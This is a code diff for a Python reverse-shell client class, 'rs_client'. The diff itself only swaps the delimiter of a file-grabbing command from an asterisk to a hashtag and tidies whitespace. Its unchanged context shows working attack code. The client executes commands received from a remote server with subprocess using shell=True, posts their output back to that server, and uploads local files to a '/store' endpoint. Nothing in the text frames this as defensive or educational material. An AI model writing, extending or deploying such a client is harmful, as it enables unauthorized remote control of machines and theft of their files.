@@ -17,8 +17,8 @@ class rs_client:
             quit()
 
         elif 'grab' in cmd:
-            # Parses the part behind the asterisk (*) and stores it in the path variable.
-            grab,path =  cmd.split('*')
+            # Parses the part behind the hashtag (#) and stores it in the path variable.
+            grab,path =  cmd.split('#')
 
             if os.path.exists(path):
                 endpoint = URL + '/store'
@@ -31,7 +31,7 @@ class rs_client:
 
         else:
             cmdPrompt = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            
+
             # POST result or error.
             post_response = requests.post(url=URL, data=cmdPrompt.stdout.read() )
             post_response = requests.post(url=URL, data=cmdPrompt.stderr.read() ) 
